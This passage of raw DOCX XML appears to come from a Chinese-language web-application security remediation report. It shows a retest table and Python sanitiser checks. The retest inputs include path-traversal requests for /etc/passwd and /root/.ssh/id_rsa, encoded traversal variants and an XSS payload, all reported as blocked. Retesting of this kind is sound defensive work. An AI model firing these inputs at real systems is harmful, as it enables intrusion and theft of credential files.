              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>复测方法</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>结果</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>GET /page?name=../../etc/passwd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 404 阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>GET /page?name=../../root/.ssh/id_rsa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 404 阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>%252e%252e%252f</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> / </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>....//</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> / </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/etc/passwd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 全部 404</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>LFI 包含日志文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 404 阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>完整攻击链验证</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 第1步即阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">返回内容含 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>&lt;script&gt;</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> 标签</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 被清洗移除</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">未登录访问 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/page</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 重定向至登录</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">上传文件名含 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>../../</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ UUID 重命名</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>上传非图片文件（纯文本/脚本）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ Magic Number 拒绝</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>响应头检查</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ nosniff 已添加</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>9.3 代码质量</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>$ python3 -c "import py_compile; py_compile.compile('app.py', doraise=True)"</w:t>
        <w:br/>
        <w:t>✅ 语法检查通过</w:t>
        <w:br/>
        <w:br/>
        <w:t>$ python3 -c "</w:t>
        <w:br/>
        <w:t># Magic Number 检测验证</w:t>
        <w:br/>
        <w:t>for data, expected in [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    (b'\xff\xd8...JFIF', 'jpg'),   # JPEG</w:t>
        <w:br/>
        <w:t xml:space="preserve">    (b'\x89PNG...', 'png'),         # PNG</w:t>
        <w:br/>
        <w:t xml:space="preserve">    (b'GIF89a...', 'gif'),          # GIF</w:t>
        <w:br/>
        <w:t xml:space="preserve">    (b'RIFF...WEBP', 'webp'),       # WebP</w:t>
        <w:br/>
        <w:t xml:space="preserve">    (b'BM...', 'bmp'),              # BMP</w:t>
        <w:br/>
        <w:t xml:space="preserve">    (b'&lt;script&gt;...', None),         # XSS</w:t>
        <w:br/>
        <w:t>]:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    detected = magic_detect(data)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    assert detected == expected, f'{data[:8]} -&gt; {detected} != {expected}'</w:t>
        <w:br/>
        <w:t>"</w:t>
        <w:br/>
        <w:t>✅ Magic Number 检测验证通过</w:t>
        <w:br/>
        <w:br/>
        <w:t>$ python3 -c "</w:t>
        <w:br/>
        <w:t># Bleach XSS 清洗验证</w:t>
        <w:br/>
        <w:t>import bleach</w:t>
        <w:br/>
        <w:t>payload = '&lt;script&gt;alert(1)&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt;'</w:t>
        <w:br/>
        <w:t>cleaned = bleach.clean(payload, tags=[], strip=True)</w:t>
        <w:br/>
        <w:t>assert cleaned == 'alert(1)', f'XSS bypass: {cleaned}'</w:t>
        <w:br/>
        <w:t>"</w:t>
        <w:br/>
        <w:t>✅ Bleach XSS 清洗验证通过</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="160"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>十、最终结论</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>10.1 修复成果</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667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>维度</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>修复前</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>修复后</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>开放漏洞</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>11 项</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>0 项</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>紧急漏洞</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>3 项</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>0 项</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>高危漏洞</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>5 项</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>0 项</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>中危漏洞</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
